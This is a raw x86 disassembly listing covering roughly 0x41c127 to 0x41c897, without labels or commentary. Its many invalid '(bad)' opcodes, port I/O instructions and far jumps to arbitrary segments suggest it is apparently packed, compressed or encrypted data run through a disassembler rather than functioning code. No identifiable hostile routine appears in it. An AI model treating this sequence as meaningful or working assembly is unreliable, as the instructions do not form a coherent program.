  41c127:	mov    ecx,0xd609d66b
  41c12c:	adc    DWORD PTR [edi],edi
  41c12e:	mov    BYTE PTR [eax],cl
  41c130:	jp     0x41c160
  41c132:	clc    
  41c133:	ds pop ecx
  41c135:	and    ah,BYTE PTR [edi]
  41c137:	jl     0x41c0fa
  41c139:	icebp  
  41c13a:	add    eax,0xdb8c45ca
  41c13f:	xor    bl,BYTE PTR [eax+0x34]
  41c142:	mov    ecx,0xfaaf6547
  41c147:	and    al,BYTE PTR [edi-0x61]
  41c14a:	scas   al,BYTE PTR es:[edi]
  41c14b:	in     al,0xd9
  41c14d:	push   ecx
  41c14e:	or     eax,0x86659ad4
  41c153:	gs push eax
  41c155:	pop    esi
  41c156:	enter  0x39a3,0xa9
  41c15a:	fwait
  41c15b:	lds    edi,FWORD PTR [esi]
  41c15d:	mov    ecx,0x8f67836f
  41c162:	std    
  41c163:	push   0x42
  41c165:	dec    edx
  41c166:	pop    ebp
  41c167:	mov    ds:0x6eced5a7,eax
  41c16c:	inc    edx
  41c16d:	or     eax,0x8a4cf88a
  41c172:	(bad)  
  41c173:	arpl   di,si
  41c175:	shr    BYTE PTR [edx-0x36],1
  41c178:	in     eax,0xb
  41c17a:	int3   
  41c17b:	xor    eax,0xba11fa2d
  41c180:	jmp    0x41c135
  41c182:	in     eax,0xa6
  41c184:	and    ebx,ecx
  41c186:	pop    es
  41c187:	mov    ebp,0xb53e5506
  41c18c:	pop    ecx
  41c18d:	lods   eax,DWORD PTR gs:[esi]
  41c18f:	mov    ebx,DWORD PTR [ebp-0x2d5f370e]
  41c195:	pop    ecx
  41c196:	cmp    esp,esi
  41c198:	pop    ebp
  41c199:	dec    edx
  41c19a:	inc    eax
  41c19b:	(bad)  
  41c19c:	xor    ch,bl
  41c19e:	test   eax,0x6e531815
  41c1a3:	and    DWORD PTR [edx],eax
  41c1a5:	mov    ah,0xcb
  41c1a7:	pop    ebx
  41c1a8:	add    eax,0xb8f938d5
  41c1ad:	add    al,0x14
  41c1af:	sar    DWORD PTR [eax],1
  41c1b1:	mov    ecx,0x7b74a05e
  41c1b6:	jmp    0xdddfbad8
  41c1bb:	jne    0x41c167
  41c1bd:	shl    DWORD PTR [edi-0x72],0xc4
  41c1c1:	push   eax
  41c1c2:	inc    ebx
  41c1c3:	lahf   
  41c1c4:	jle    0x41c17b
  41c1c6:	fldenv [eax-0x366579f9]
  41c1cc:	adc    eax,0x6be65c78
  41c1d1:	cmp    BYTE PTR [edi],0x60
  41c1d4:	out    0xa4,al
  41c1d6:	stos   BYTE PTR es:[edi],al
  41c1d7:	addr16 dec esi
  41c1d9:	xchg   ecx,eax
  41c1da:	test   BYTE PTR [esi],0x84
  41c1dd:	mov    dh,BYTE PTR [ebx-0x41]
  41c1e0:	xor    al,0xeb
  41c1e2:	jb     0x41c17c
  41c1e4:	imul   esi,DWORD PTR [edx+0x3ec1f81],0xebc984b0
  41c1ee:	pop    ecx
  41c1ef:	(bad)  
  41c1f1:	or     DWORD PTR [edx-0x4b],edi
  41c1f4:	pop    ebx
  41c1f5:	lods   eax,DWORD PTR ds:[esi]
  41c1f6:	cmp    BYTE PTR [ecx],0x12
  41c1f9:	mov    eax,ds:0xcf7bb727
  41c1fe:	push   edi
  41c1ff:	out    dx,al
  41c200:	pop    ss
  41c201:	(bad)  
  41c202:	xor    bh,BYTE PTR [ebx+0x5c5166c8]
  41c208:	dec    ebx
  41c209:	sbb    DWORD PTR [edi-0x5a],ebp
  41c20c:	push   ss
  41c20d:	add    ebp,ebx
  41c20f:	rcr    DWORD PTR [eax+0x5863ff3f],0xbe
  41c216:	inc    esi
  41c217:	and    dl,BYTE PTR [edi+0x62ee1331]
  41c21d:	mov    ds,edx
  41c21f:	mov    ch,0x7e
  41c221:	(bad)  
  41c222:	jp     0x41c1fb
  41c224:	cmp    eax,0xb1393c7
  41c229:	cmp    BYTE PTR [ebx],bl
  41c22b:	shr    eax,0x5f
  41c22e:	jg     0x41c246
  41c230:	lock mov edi,0x3af88cf7
  41c236:	jbe    0x41c239
  41c238:	jne    0x41c270
  41c23a:	adc    eax,0xe60c4167
  41c23f:	(bad)  
  41c240:	mov    ds,WORD PTR [ecx]
  41c242:	xchg   ebp,eax
  41c243:	xchg   ecx,eax
  41c244:	adc    esi,esp
  41c246:	aad    0xc2
  41c248:	(bad)  [edx]
  41c24a:	xor    ebx,edi
  41c24c:	cmp    al,0x6
  41c24e:	(bad)  
  41c24f:	lods   eax,DWORD PTR ds:[esi]
  41c250:	sub    bl,BYTE PTR [ebx-0x2d]
  41c253:	mov    bh,bl
  41c255:	dec    ecx
  41c256:	xor    BYTE PTR [ebp-0x32],cl
  41c259:	cli    
  41c25a:	pop    ebp
  41c25b:	cmp    BYTE PTR gs:[esi],ch
  41c25e:	sbb    al,0x25
  41c260:	dec    esp
  41c261:	shl    ch,cl
  41c263:	loope  0x41c259
  41c265:	mov    ah,0x9f
  41c267:	retf   0x67a0
  41c26a:	shl    esi,0xad
  41c26d:	sti    
  41c26e:	popa   
  41c26f:	aam    0x5
  41c271:	jno    0x41c27f
  41c273:	ins    BYTE PTR es:[edi],dx
  41c274:	lahf   
  41c275:	ins    BYTE PTR es:[edi],dx
  41c276:	dec    esp
  41c277:	lods   al,BYTE PTR ds:[esi]
  41c278:	pop    esp
  41c279:	pop    esi
  41c27a:	pop    ebp
  41c27b:	fistp  WORD PTR [edx]
  41c27d:	inc    eax
  41c27e:	sahf   
  41c27f:	xor    al,0xd7
  41c281:	(bad)  
  41c282:	push   0x6e346b23
  41c287:	test   BYTE PTR [edx],bh
  41c289:	mov    al,BYTE PTR [edx-0x53]
  41c28c:	adc    al,0xb
  41c28e:	pop    ecx
  41c28f:	int3   
  41c290:	pop    es
  41c291:	inc    eax
  41c292:	(bad)  
  41c293:	jle    0x41c237
  41c295:	aad    0x8e
  41c297:	inc    ecx
  41c298:	stc    
  41c299:	xor    eax,0x5e38c14c
  41c29e:	add    eax,0x8bae068a
  41c2a3:	adc    BYTE PTR [eax-0x6b],0x38
  41c2a7:	bound  esp,QWORD PTR [ebx+0x63b13ffd]
  41c2ad:	test   DWORD PTR [edi],esi
  41c2af:	sub    BYTE PTR [esi],al
  41c2b1:	jae    0x41c28d
  41c2b3:	cli    
  41c2b4:	mov    al,0xd7
  41c2b6:	pop    ecx
  41c2b7:	adc    BYTE PTR [edx-0x65070451],0xdc
  41c2be:	dec    eax
  41c2bf:	cmp    DWORD PTR [eax],eax
  41c2c1:	int    0x55
  41c2c3:	outs   dx,DWORD PTR ds:[esi]
  41c2c4:	pop    ss
  41c2c5:	cmovne ebx,DWORD PTR [esi-0xdba466b]
  41c2cc:	lods   al,BYTE PTR ds:[esi]
  41c2cd:	es push edx
  41c2cf:	ins    DWORD PTR es:[edi],dx
  41c2d0:	and    BYTE PTR ds:0x7b613220,ah
  41c2d6:	pop    esp
  41c2d7:	popa   
  41c2d8:	das    
  41c2d9:	sbb    ch,al
  41c2db:	cs loope 0x41c2d6
  41c2de:	add    DWORD PTR ds:0xb24cd361,ecx
  41c2e4:	aam    0xd7
  41c2e6:	fst    DWORD PTR [edi+0x7d]
  41c2e9:	mov    cs,WORD PTR [ecx-0x36]
  41c2ec:	inc    ecx
  41c2ed:	xchg   edi,edx
  41c2ef:	test   BYTE PTR [edi],bh
  41c2f1:	pushf  
  41c2f2:	fnstsw ax
  41c2f4:	dec    ebp
  41c2f5:	and    eax,0x68935ba2
  41c2fa:	xchg   edi,eax
  41c2fb:	out    0x63,al
  41c2fd:	sti    
  41c2fe:	test   al,0x69
  41c300:	mov    bh,0x7e
  41c302:	jp     0x41c2fb
  41c304:	aas    
  41c305:	sbb    cl,BYTE PTR [ebx+esi*2-0x6987b1e8]
  41c30c:	inc    esp
  41c30d:	test   dl,ch
  41c30f:	fwait
  41c310:	xor    dh,BYTE PTR [ebx+0x17]
  41c313:	push   ebx
  41c314:	aad    0x14
  41c316:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c317:	pop    ss
  41c318:	pushf  
  41c319:	data16 jb 0x41c376
  41c31c:	adc    edi,ecx
  41c31e:	(bad)  
  41c31f:	xor    ebx,DWORD PTR [edx-0x65]
  41c322:	push   es
  41c323:	rol    edi,cl
  41c325:	(bad)  
  41c326:	ds js  0x41c2c0
  41c329:	mov    al,0xd3
  41c32b:	jae    0x41c2eb
  41c32d:	adc    eax,0x12e5c51
  41c332:	mov    ebx,0x90f3718c
  41c337:	jmp    0x41c3b1
  41c339:	int3   
  41c33a:	dec    ecx
  41c33b:	ins    DWORD PTR es:[edi],dx
  41c33c:	fbld   TBYTE PTR [edx+0x73dad385]
  41c342:	pop    es
  41c343:	int    0x85
  41c345:	and    DWORD PTR [edi-0x7f75346b],ecx
  41c34b:	jl     0x41c339
  41c34d:	push   esi
  41c34e:	jmp    0x3b08b54b
  41c353:	adc    dl,BYTE PTR [ebp+0x6172436d]
  41c359:	sub    al,0xe2
  41c35b:	stc    
  41c35c:	push   esp
  41c35d:	ret    
  41c35e:	adc    DWORD PTR [esi+0x3ab66f2f],ebx
  41c364:	mov    al,ds:0x84c4948
  41c369:	xor    eax,0x5db69c9c
  41c36e:	(bad)  
  41c36f:	and    ah,dl
  41c371:	mov    ds:0xae2d67fa,eax
  41c376:	(bad)  
  41c377:	sub    BYTE PTR es:[ebp-0x796ade14],dl
  41c37e:	xlat   BYTE PTR ds:[ebx]
  41c37f:	xchg   edx,eax
  41c380:	jno    0x41c311
  41c382:	sbb    edx,ecx
  41c384:	fstp   DWORD PTR [edx]
  41c386:	ins    BYTE PTR es:[edi],dx
  41c387:	push   0xd8d84b57
  41c38c:	ret    0xf761
  41c38f:	dec    esi
  41c390:	or     eax,0xab5c800c
  41c395:	xchg   ecx,eax
  41c396:	aas    
  41c397:	or     BYTE PTR [ebx-0x1a1bcc2d],dl
  41c39d:	jp     0x41c393
  41c39f:	jo     0x41c3c1
  41c3a1:	add    eax,0x9115e21b
  41c3a6:	sub    ebx,DWORD PTR [ecx]
  41c3a8:	xchg   edx,eax
  41c3a9:	adc    al,0xdd
  41c3ab:	xchg   DWORD PTR [eax],ecx
  41c3ad:	and    dl,BYTE PTR [edi-0x19540284]
  41c3b3:	cli    
  41c3b4:	aas    
  41c3b5:	cmp    DWORD PTR [ecx+0x2e],edi
  41c3b8:	pop    ecx
  41c3b9:	fidivr DWORD PTR [ebx]
  41c3bb:	jb     0x41c374
  41c3bd:	test   edx,esp
  41c3bf:	push   edi
  41c3c0:	and    eax,0xacc65256
  41c3c5:	or     ch,dh
  41c3c7:	pop    edi
  41c3c8:	xor    ebp,ebp
  41c3ca:	pop    ebx
  41c3cb:	mov    fs,WORD PTR [ecx-0x2de8d0c]
  41c3d1:	inc    ecx
  41c3d2:	and    al,0x30
  41c3d4:	mov    edx,DWORD PTR [edi+0x12ad0631]
  41c3da:	and    eax,0xeaf29c41
  41c3df:	cli    
  41c3e0:	jecxz  0x41c447
  41c3e2:	xor    bh,BYTE PTR [edi-0x2c5ce4f2]
  41c3e8:	int    0xe7
  41c3ea:	inc    esp
  41c3eb:	and    BYTE PTR [eax+0x4d],dl
  41c3ee:	dec    esi
  41c3ef:	popf   
  41c3f0:	test   al,0x3d
  41c3f2:	mov    bl,0x1c
  41c3f4:	adc    DWORD PTR [edx],eax
  41c3f6:	std    
  41c3f7:	fbstp  TBYTE PTR [edi+0x8]
  41c3fa:	cld    
  41c3fb:	call   0x7d14:0x5cdf6128
  41c402:	pop    esp
  41c403:	shl    BYTE PTR [eax],cl
  41c405:	adc    ch,BYTE PTR [ebx+esi*8]
  41c408:	jmp    FWORD PTR [ebp+ecx*4-0x7e43e794]
  41c40f:	cld    
  41c410:	fwait
  41c411:	lahf   
  41c412:	neg    BYTE PTR ds:0x42e36f2c
  41c418:	loop   0x41c43d
  41c41a:	mov    ebx,eax
  41c41c:	outs   dx,BYTE PTR ds:[esi]
  41c41d:	adc    ebx,DWORD PTR [ecx]
  41c41f:	repnz fild QWORD PTR [ecx]
  41c422:	(bad)  
  41c423:	mov    dl,0xb8
  41c425:	(bad)  
  41c427:	dec    esi
  41c428:	or     cl,ah
  41c42a:	cdq    
  41c42b:	popf   
  41c42c:	mov    ds:0x7ffba3b2,al
  41c431:	jbe    0x41c43d
  41c433:	xor    ecx,DWORD PTR [edx+ebx*4-0x4ef07bba]
  41c43a:	pop    esp
  41c43b:	and    BYTE PTR [edx-0x1f],0xf8
  41c43f:	jmp    0x41c49f
  41c441:	ins    DWORD PTR es:[edi],dx
  41c442:	je     0x41c47c
  41c444:	xchg   ebx,eax
  41c445:	lahf   
  41c446:	mov    esp,0xaf5d9c3a
  41c44b:	or     ecx,DWORD PTR [esi+0x22]
  41c44e:	add    BYTE PTR [ebp+0x1cc32e12],cl
  41c454:	xor    eax,0x99249156
  41c459:	sar    BYTE PTR ds:0x55978cdf,1
  41c45f:	out    dx,al
  41c460:	bound  esi,QWORD PTR [esi+0x42]
  41c463:	stos   DWORD PTR es:[edi],eax
  41c464:	mov    bl,0x67
  41c466:	inc    esi
  41c467:	ins    DWORD PTR es:[edi],dx
  41c468:	push   es
  41c469:	call   0xf5f0:0xc9d0c3d6
  41c470:	pushf  
  41c471:	sti    
  41c472:	push   ds
  41c473:	dec    edx
  41c474:	inc    ebp
  41c475:	push   esp
  41c476:	(bad)  
  41c477:	retf   
  41c478:	push   es
  41c479:	jno    0x41c468
  41c47b:	iret   
  41c47c:	inc    esp
  41c47d:	out    0xaa,eax
  41c47f:	stos   BYTE PTR es:[edi],al
  41c480:	stos   DWORD PTR es:[edi],eax
  41c481:	xchg   ebx,eax
  41c482:	out    0xe7,al
  41c484:	pop    es
  41c485:	sbb    DWORD PTR [edx],edi
  41c487:	retf   
  41c488:	iret   
  41c489:	sbb    DWORD PTR [ebx+0x5c],ecx
  41c48c:	add    BYTE PTR [esi+esi*1],dh
  41c48f:	xor    eax,0xe04ed3a
  41c494:	pop    es
  41c495:	enter  0x21ba,0x97
  41c499:	add    eax,0xcc486029
  41c49e:	and    al,0x5d
  41c4a0:	fs call 0x55d2a7f
  41c4a6:	loope  0x41c44a
  41c4a8:	rol    bl,1
  41c4aa:	mov    dl,dl
  41c4ac:	pop    ebp
  41c4ad:	rcr    cl,0x55
  41c4b0:	inc    esi
  41c4b1:	mov    edx,0x187bc36e
  41c4b6:	jmp    0x4063:0x2b4833da
  41c4bd:	repnz sub ch,BYTE PTR [esi+0x49]
  41c4c1:	retf   0x78bc
  41c4c4:	xchg   BYTE PTR [edi+0x6b],ah
  41c4c7:	sub    eax,DWORD PTR [esi-0x47]
  41c4ca:	mov    bh,0xcb
  41c4cc:	sti    
  41c4cd:	mov    ds:0xcef6cf7d,eax
  41c4d2:	out    dx,al
  41c4d3:	pop    ss
  41c4d4:	pop    eax
  41c4d5:	(bad)  
  41c4d6:	mov    cl,0x36
  41c4d8:	push   ss
  41c4d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4da:	dec    ebp
  41c4db:	ret    0xabd8
  41c4de:	mov    ah,0xbc
  41c4e0:	push   ds
  41c4e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4e2:	lds    edx,FWORD PTR [ebx+0x41]
  41c4e5:	in     al,dx
  41c4e6:	fnstsw WORD PTR [ecx]
  41c4e8:	sub    eax,0x7583cda9
  41c4ed:	inc    eax
  41c4ee:	add    al,0xb4
  41c4f0:	fisub  WORD PTR [edi]
  41c4f2:	imul   edi,DWORD PTR gs:[eax-0x2837eae7],0x19
  41c4fa:	daa    
  41c4fb:	sub    DWORD PTR [edx*1-0x6422fe96],edx
  41c502:	je     0x41c56d
  41c504:	xchg   esi,eax
  41c505:	add    DWORD PTR [edi-0x70],0x7b46e7eb
  41c50c:	sub    al,0x9f
  41c50e:	fistp  WORD PTR [esi]
  41c510:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c511:	pusha  
  41c512:	mov    edx,0x40fa4511
  41c517:	int    0x2b
  41c519:	sub    eax,0x29374ef8
  41c51e:	(bad)  
  41c51f:	sbb    BYTE PTR [ebx+eax*4],al
  41c522:	jge    0x41c4b2
  41c524:	inc    edi
  41c525:	ins    WORD PTR es:[edi],dx
  41c527:	ins    BYTE PTR es:[edi],dx
  41c528:	pop    ss
  41c529:	xchg   esp,eax
  41c52a:	aad    0x97
  41c52c:	mov    DWORD PTR [edi+0x470bced8],edi
  41c532:	std    
  41c533:	cmp    edi,edi
  41c535:	sar    BYTE PTR [ebx+0x71],cl
  41c538:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c539:	test   eax,0xc6e08869
  41c53e:	or     al,0x55
  41c540:	int    0xe7
  41c542:	mov    esi,esi
  41c544:	cmp    eax,0x2e86a9ba
  41c549:	js     0x41c555
  41c54b:	xor    al,0x35
  41c54d:	push   es
  41c54e:	xchg   esp,eax
  41c54f:	inc    ecx
  41c550:	push   ss
  41c551:	xchg   DWORD PTR [edi+0x581f0b57],edx
  41c557:	int3   
  41c558:	add    al,0x93
  41c55a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c55b:	in     eax,0xb6
  41c55d:	lods   al,BYTE PTR ds:[esi]
  41c55e:	out    dx,eax
  41c55f:	and    eax,0x7e7eb458
  41c564:	jecxz  0x41c58c
  41c566:	xor    esi,DWORD PTR [ebx]
  41c568:	inc    esi
  41c569:	imul   esp,ebp,0xffffffc5
  41c56c:	loope  0x41c5d7
  41c56e:	imul   esp,DWORD PTR [ecx-0x3e726ad1],0xffffff98
  41c575:	addr16 xor dh,cl
  41c578:	push   ecx
  41c579:	daa    
  41c57a:	mov    esp,0x7eb1b91a
  41c57f:	pop    esi
  41c580:	push   esi
  41c581:	(bad)  
  41c582:	mov    al,ds:0xff96e7db
  41c587:	out    0x69,al
  41c589:	jp     0x41c5e1
  41c58b:	push   cs
  41c58c:	sub    BYTE PTR [edx-0x6],bl
  41c58f:	pop    es
  41c590:	add    DWORD PTR [ebx-0x22499dd],edi
  41c596:	idiv   DWORD PTR [esi]
  41c598:	adc    al,0x83
  41c59a:	cmp    al,0x76
  41c59c:	and    cl,BYTE PTR [edx]
  41c59e:	mov    ebx,0xd61c7b6d
  41c5a3:	inc    esi
  41c5a4:	enter  0xa585,0x6
  41c5a8:	icebp  
  41c5a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5aa:	push   edx
  41c5ab:	test   eax,0x7a6f6cae
  41c5b0:	enter  0xebaf,0xbe
  41c5b4:	mov    eax,0xb81ca40
  41c5b9:	fild   DWORD PTR [ebx+0x11]
  41c5bc:	push   edi
  41c5bd:	sar    esi,0x6b
  41c5c0:	cmc    
  41c5c1:	mov    esp,0x4a644e05
  41c5c6:	ret    0xffba
  41c5c9:	aam    0x7b
  41c5cb:	retf   0x2423
  41c5ce:	mov    WORD PTR [eax],ds
  41c5d0:	sub    BYTE PTR gs:[esi],ah
  41c5d3:	test   al,0x31
  41c5d5:	cmp    esi,edx
  41c5d7:	xchg   ebx,ecx
  41c5d9:	(bad)  
  41c5da:	jecxz  0x41c5a7
  41c5dc:	or     dl,BYTE PTR fs:[edx+0x37b28404]
  41c5e3:	push   ds
  41c5e4:	arpl   WORD PTR [ecx+eax*4+0x60001556],di
  41c5eb:	mov    esp,0x8079e229
  41c5f0:	push   ebp
  41c5f1:	loope  0x41c57d
  41c5f3:	xchg   esi,eax
  41c5f4:	mov    ebx,0xc2c0159a
  41c5f9:	sahf   
  41c5fa:	cwde   
  41c5fb:	dec    esi
  41c5fc:	popa   
  41c5fd:	cld    
  41c5fe:	mov    cl,0x9a
  41c600:	out    dx,al
  41c601:	test   DWORD PTR [edx+0x32],ecx
  41c604:	mov    ds:0xc63776b3,al
  41c609:	lock pop esi
  41c60b:	in     al,0xe0
  41c60d:	push   ss
  41c60e:	xor    al,al
  41c610:	mov    bh,0x73
  41c612:	push   ebp
  41c613:	shl    DWORD PTR [esi-0x377fbae7],1
  41c619:	sbb    al,0xdb
  41c61b:	or     DWORD PTR [ebp+0x2],edx
  41c61e:	xchg   esp,eax
  41c61f:	dec    edx
  41c620:	xchg   ebp,eax
  41c621:	(bad)  
  41c622:	lods   al,BYTE PTR ds:[esi]
  41c623:	jle    0x41c5e0
  41c625:	pusha  
  41c626:	jp     0x41c69e
  41c628:	and    DWORD PTR [ecx+0x69430774],esi
  41c62e:	retf   
  41c62f:	in     al,dx
  41c630:	pop    es
  41c631:	stc    
  41c632:	inc    esi
  41c633:	jecxz  0x41c66a
  41c635:	rcl    DWORD PTR [ebx-0x19f5792e],1
  41c63b:	push   eax
  41c63c:	iret   
  41c63d:	js     0x41c5d1
  41c63f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c640:	mov    dh,ch
  41c642:	pushf  
  41c643:	aam    0xb9
  41c645:	cwde   
  41c646:	mov    ebx,0x2b86f78a
  41c64b:	bound  edx,QWORD PTR [esp+edi*1-0x5852cfc2]
  41c652:	ficom  DWORD PTR [ecx+0x10]
  41c655:	jne    0x41c6b2
  41c657:	fs ds test al,cl
  41c65b:	scas   eax,DWORD PTR es:[edi]
  41c65c:	mov    eax,ds:0x58a65c58
  41c661:	mov    eax,DWORD PTR es:[edi]
  41c664:	cdq    
  41c665:	mov    ds:0xc79772a7,eax
  41c66a:	jne    0x41c657
  41c66c:	jmp    0x30de:0x3a4990cf
  41c673:	mov    eax,ds:0x4e3a3274
  41c678:	pusha  
  41c679:	hlt    
  41c67a:	fdivrp st(4),st
  41c67c:	sub    eax,0x42b9d7f2
  41c681:	dec    ecx
  41c682:	sub    al,0xbb
  41c684:	nop
  41c685:	mov    ds:0xb07aaf9d,eax
  41c68a:	fcomp  DWORD PTR [esi-0x2c]
  41c68d:	inc    esi
  41c68e:	addr16 mov ecx,0xe7db024e
  41c694:	inc    esi
  41c695:	sub    DWORD PTR [edi+eax*2],0xfffffff8
  41c699:	dec    esp
  41c69a:	ss ja  0x41c648
  41c69d:	retf   0x7ae6
  41c6a0:	ins    BYTE PTR es:[edi],dx
  41c6a1:	jle    0x41c63e
  41c6a3:	icebp  
  41c6a4:	int    0xbe
  41c6a6:	push   ecx
  41c6a7:	(bad)  
  41c6a8:	mov    eax,0x8278d74b
  41c6ad:	test   DWORD PTR [ebx],edx
  41c6af:	lods   al,BYTE PTR ds:[esi]
  41c6b0:	sub    DWORD PTR [ebx+edx*4],ebp
  41c6b3:	inc    BYTE PTR [ecx-0x5d]
  41c6b6:	xor    eax,0x8975dd97
  41c6bb:	push   0xda4a955
  41c6c0:	mov    ds:0x5796a44b,eax
  41c6c5:	outs   dx,BYTE PTR ds:[esi]
  41c6c6:	jmp    0x1490:0x8207e048
  41c6cd:	int3   
  41c6ce:	dec    edi
  41c6cf:	call   0x564c:0xa37e3ac0
  41c6d6:	daa    
  41c6d7:	hlt    
  41c6d8:	jno    0x41c6a0
  41c6da:	and    BYTE PTR [edi+edi*8+0x3c],ch
  41c6de:	stos   BYTE PTR es:[edi],al
  41c6df:	ins    BYTE PTR es:[edi],dx
  41c6e0:	(bad)  
  41c6e1:	jo     0x41c70d
  41c6e3:	dec    ebp
  41c6e4:	or     al,0x12
  41c6e6:	test   DWORD PTR [edi-0x7661b197],ecx
  41c6ec:	mov    al,BYTE PTR [ebp+0x59]
  41c6ef:	xorps  xmm5,xmm3
  41c6f2:	ss ret 
  41c6f4:	nop
  41c6f5:	push   esi
  41c6f6:	mov    dl,0xfa
  41c6f8:	and    ecx,0x56f21e8
  41c6fe:	arpl   WORD PTR [edi-0x35b49a4c],cx
  41c704:	pusha  
  41c705:	js     0x41c6fd
  41c707:	pop    eax
  41c708:	or     eax,DWORD PTR [edx+0x7f22c5a8]
  41c70e:	xchg   ebp,eax
  41c70f:	push   ebp
  41c710:	push   DWORD PTR [ebx+0x78]
  41c713:	sbb    eax,ebp
  41c715:	push   0x6e8efac0
  41c71a:	(bad)  
  41c71b:	cmp    BYTE PTR [edx-0x52],dl
  41c71e:	adc    ah,BYTE PTR [esi+0x5c]
  41c721:	mov    ebx,0xdaa4b552
  41c726:	push   cs
  41c727:	dec    esp
  41c728:	push   0xbc446e8
  41c72d:	push   ebx
  41c72e:	in     al,0xc
  41c730:	cmp    dl,BYTE PTR [edi-0x65e03c19]
  41c736:	jg     0x41c703
  41c738:	pop    es
  41c739:	mov    DWORD PTR [edx+0x52],ebx
  41c73c:	push   0xffffff9d
  41c73e:	in     al,0x77
  41c740:	int3   
  41c741:	retf   
  41c742:	in     eax,dx
  41c743:	inc    ebp
  41c744:	sub    eax,0x7bb3fa0f
  41c749:	add    al,0xfa
  41c74b:	mov    dl,0xe6
  41c74d:	fcomp  DWORD PTR [edx-0x59]
  41c750:	shl    BYTE PTR [eax+0x3],1
  41c753:	sub    BYTE PTR [edi],ch
  41c755:	mov    edx,0x2b7647b0
  41c75a:	nop
  41c75b:	adc    BYTE PTR [edi],ch
  41c75d:	mov    ebx,0x19fb35f
  41c762:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c763:	xchg   ebx,eax
  41c764:	dec    esi
  41c765:	sti    
  41c766:	sbb    eax,0x55f13b52
  41c76b:	test   al,0xe6
  41c76d:	and    bl,BYTE PTR [ebx]
  41c76f:	cmp    eax,0xa04fa1c6
  41c774:	push   es
  41c775:	jo     0x41c702
  41c777:	scas   eax,DWORD PTR es:[edi]
  41c778:	sbb    dh,BYTE PTR [edi-0x3a556738]
  41c77e:	adc    BYTE PTR [ebp+ecx*4+0x77],0x5
  41c783:	jbe    0x41c732
  41c785:	cmp    ch,dh
  41c787:	cmp    DWORD PTR [esi],ebp
  41c789:	push   edx
  41c78a:	(bad)  
  41c78b:	fwait
  41c78c:	jecxz  0x41c787
  41c78e:	icebp  
  41c78f:	xlat   BYTE PTR ds:[ebx]
  41c790:	xor    al,0xea
  41c792:	jnp    0x41c745
  41c794:	sub    al,0x9
  41c797:	sub    bh,al
  41c799:	and    DWORD PTR [esp+edx*2+0xd1c08ea],ebx
  41c7a0:	femms  
  41c7a2:	bound  esi,QWORD PTR [edi-0x4154f6f5]
  41c7a8:	in     eax,dx
  41c7a9:	xchg   edi,eax
  41c7aa:	add    DWORD PTR [edi],ebx
  41c7ac:	sub    edx,DWORD PTR [edx]
  41c7ae:	fnclex 
  41c7b0:	jmp    0xd75b:0xfba40e8f
  41c7b7:	cld    
  41c7b8:	jmp    0xcd99297d
  41c7bd:	ins    BYTE PTR es:[edi],dx
  41c7be:	cmc    
  41c7bf:	mov    DWORD PTR [eax],ebx
  41c7c1:	test   al,0x63
  41c7c3:	mov    ah,0xa7
  41c7c5:	sub    BYTE PTR [edi-0x31],bl
  41c7c8:	or     eax,0x86a113b
  41c7cd:	in     al,dx
  41c7ce:	xchg   edi,eax
  41c7cf:	je     0x41c792
  41c7d1:	loopne 0x41c79a
  41c7d3:	in     eax,dx
  41c7d4:	bound  ecx,QWORD PTR [esi-0x166c9f8e]
  41c7da:	out    dx,al
  41c7db:	outs   dx,DWORD PTR ds:[esi]
  41c7dc:	inc    BYTE PTR [ebp+0x2e6f992b]
  41c7e2:	or     BYTE PTR [edx],dh
  41c7e4:	(bad)  
  41c7e5:	mov    eax,ds:0x6768a5c5
  41c7ea:	(bad)  
  41c7eb:	mov    eax,ds:0x3def10ce
  41c7f0:	test   eax,0xe485d00d
  41c7f5:	call   0xcbc5:0x18cad6a5
  41c7fc:	or     BYTE PTR [edx+0x63],dl
  41c7ff:	or     bl,BYTE PTR [esi+0x3dbbcc88]
  41c805:	std    
  41c806:	sub    BYTE PTR [edi],bl
  41c808:	lods   eax,DWORD PTR ds:[esi]
  41c809:	cs and al,0x5c
  41c80c:	je     0x41c7ea
  41c80e:	int3   
  41c80f:	jae    0x41c800
  41c811:	dec    esp
  41c812:	shl    ecx,1
  41c814:	add    al,0x27
  41c816:	scas   eax,DWORD PTR es:[edi]
  41c817:	outs   dx,DWORD PTR gs:[esi]
  41c819:	test   eax,0x57668306
  41c81e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c81f:	jb     0x41c860
  41c821:	cmp    DWORD PTR [edi-0x33],ecx
  41c824:	push   0xffffffab
  41c826:	cmp    eax,0xaa81d1ef
  41c82b:	sub    BYTE PTR [esi-0x71eea5c4],ch
  41c831:	cwde   
  41c832:	inc    esi
  41c833:	push   esi
  41c834:	xchg   edx,eax
  41c835:	(bad)
  41c838:	nop
  41c839:	xchg   BYTE PTR [edx+ecx*1-0x6a],dh
  41c83d:	arpl   WORD PTR [ebx+0x16ec853f],ax
  41c843:	es in  al,dx
  41c845:	mov    ds:0x2ca3507a,al
  41c84a:	cld    
  41c84b:	sub    ebp,DWORD PTR [edx-0x62]
  41c84e:	xor    BYTE PTR [eax+0x1f3e2612],bl
  41c854:	rcl    BYTE PTR [ebx-0x12],cl
  41c857:	sub    ebx,DWORD PTR [ecx+0x19033b9d]
  41c85d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c85e:	cmp    BYTE PTR [esi],ah
  41c860:	dec    edi
  41c861:	mov    ebx,0xe3ea54a9
  41c866:	mov    eax,0xec15d26
  41c86b:	add    DWORD PTR [esi-0x67f0f60f],edi
  41c871:	rcr    ah,cl
  41c873:	push   cs
  41c874:	xchg   edi,eax
  41c875:	test   eax,0xc6d8a2ed
  41c87a:	mov    dh,0x54
  41c87c:	push   eax
  41c87d:	and    al,0x75
  41c87f:	aam    0xfc
  41c881:	aaa    
  41c882:	ja     0x41c89b
  41c884:	aas    
  41c885:	mov    eax,0x52a2bee2
  41c88a:	repz mov edx,0xd8830752
  41c890:	sub    DWORD PTR ss:[edi-0x74d7cb6e],esp
  41c897:	fdivr  QWORD PTR [esi+0x552e625f]
